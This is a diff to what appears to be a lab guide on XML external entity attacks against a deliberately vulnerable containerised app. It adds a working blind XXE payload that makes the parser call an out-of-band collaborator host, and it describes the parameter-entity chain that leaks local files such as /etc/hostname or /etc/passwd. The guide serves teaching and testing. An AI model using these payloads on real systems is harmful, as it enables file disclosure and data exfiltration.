@@ -60,9 +60,31 @@ Saves to `payload.xml`, POST to `/import.php`. The parser substitutes `&xxe;` wi
 
 Expected: the response includes a `<div class="bookmark">` whose `<strong>` is the full `/etc/passwd` content from the container.
 
-### 2. Blind XXE via parameter entities + OOB DTD
+### 2. Blind XXE: out-of-band HTTP exfil
 
-POST to `/upload-blind.php`. The response is just `OK`, but the exfiltrated data appears in the collaborator log.
+POST to `/upload-blind.php`. The response is just `OK`, but libxml fetches the SYSTEM URL when it resolves the `&exfil;` reference, and the request lands in the collaborator log.
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY exfil SYSTEM "http://xxe-basic-collab/?leak=fired">
+]>
+<bookmarks>
+  <bookmark><name>&exfil;</name><url>http://x</url></bookmark>
+</bookmarks>
+```
+
+Then tail the collaborator:
+
+```bash
+docker compose logs -f xxe-basic-collab
+```
+
+Expected: a line of the form `[collab] GET from <ip> path=/?leak=fired`. This proves the OOB primitive works: the lab's libxml resolves the external entity by issuing an outbound HTTP request to a server the attacker controls, even though the endpoint reflects nothing back in its own response.
+
+#### A note on the textbook "parameter entity recursive DTD" pattern
+
+Most XXE write-ups demonstrate blind file-content exfil with a recursive parameter-entity chain in an external DTD:
 
 ```xml
 <?xml version="1.0"?>
@@ -75,13 +97,11 @@ POST to `/upload-blind.php`. The response is just `OK`, but the exfiltrated data
 </bookmarks>
 ```
 
-Then tail the collaborator:
+where `evil.dtd` defines `%file` (reads a local file), then uses `%eval` to declare a new entity `%exfil` whose SYSTEM URL embeds `%file;` in its query string, then forces `%exfil;` to resolve. The lab ships such an `evil.dtd` under `xxe-basic-collab/`.
 
-```bash
-docker compose logs -f xxe-basic-collab
-```
+Against this lab's libxml (2.9.14 on PHP 8.2) the DTD itself loads (the collaborator logs `GET /evil.dtd`) but the second-stage `%exfil` GET never fires. libxml has tightened parameter-entity processing across the 2.9.x series and now refuses to define a new entity inside the expansion of another entity loaded from an external DTD, which is the mechanic that classic OOB file-content exfil depends on.
 
-Expected: a line of the form `[collab] GET from <ip> path=/?leak=<hostname-of-xxe-basic-container>`. The DTD served by the collaborator chains parameter entities to read `/etc/hostname` and embed its contents into the URL that libxml then fetches.
+This is real, current 2026 behaviour. The OOB primitive (this scenario) still works; the file-content-exfil-via-recursive-PE pattern works only against older or differently-configured parsers. The article walks both: the textbook pattern as the historical baseline, the direct-entity OOB as the version that fires today.
 
 ### 3. Billion laughs (entity expansion DoS, mitigated by default)
 
